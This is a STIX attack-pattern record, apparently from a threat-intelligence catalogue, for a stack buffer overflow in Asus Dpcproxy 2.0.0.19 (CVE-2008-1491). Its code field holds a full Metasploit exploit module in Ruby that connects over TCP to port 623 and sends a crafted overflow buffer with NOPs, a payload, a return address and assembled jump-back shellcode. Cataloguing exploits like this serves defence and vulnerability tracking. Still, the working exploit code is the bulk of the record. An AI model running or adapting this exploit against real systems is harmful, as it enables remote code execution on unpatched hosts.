{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--246092c0-3494-4102-a209-18046b78624c",
    "created": "2024-08-14T16:46:25.472154Z",
    "modified": "2024-08-14T16:46:25.472158Z",
    "name": "Asus Dpcproxy Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Asus Dpcroxy version 2.0.0.19. It should be vulnerable until version 2.0.0.24. Credit to Luigi Auriemma ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/asus_dpcproxy_overflow.rb",
            "external_id": "asus_dpcproxy_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1491"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Asus Dpcproxy Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Asus Dpcroxy version 2.0.0.19.\n          It should be vulnerable until version 2.0.0.24.\n          Credit to Luigi Auriemma\n      },\n      'Author'         => 'Jacopo Cervini',\n      'References'     =>\n        [\n          [ 'CVE', '2008-1491' ],\n          [ 'OSVDB', '43638' ],\n          [ 'BID', '28394' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x07\\x08\\x0d\\x0e\\x0f\\x7e\\x7f\\xff\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Asus Dpcroxy version 2.00.19 Universal',     { 'Ret' => 0x0040273b } ], # p/p/r\n        ],\n      'Privileged'     => true,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-03-21'))\n\n    register_options([Opt::RPORT(623)])\n\n  end\n\n  def exploit\n    connect\n\n    sploit =   make_nops(0x38a - payload.encoded.length)+ payload.encoded + rand_text_english(6032)\n    sploit << Rex::Arch::X86.jmp_short(6) + make_nops(2)\n    sploit << [target.ret].pack('V') +  make_nops(8) + Metasm::Shellcode.assemble(Metasm::Ia32.new, \"add bh,6 add bh,6 add bh,2 push ebx ret\").encode_string #jmp back\n    sploit << make_nops(50)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(sploit)\n    select(nil,nil,nil,3) # =(\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-03-21",
    "x_mitre_platforms": [
        "win'"
    ]
}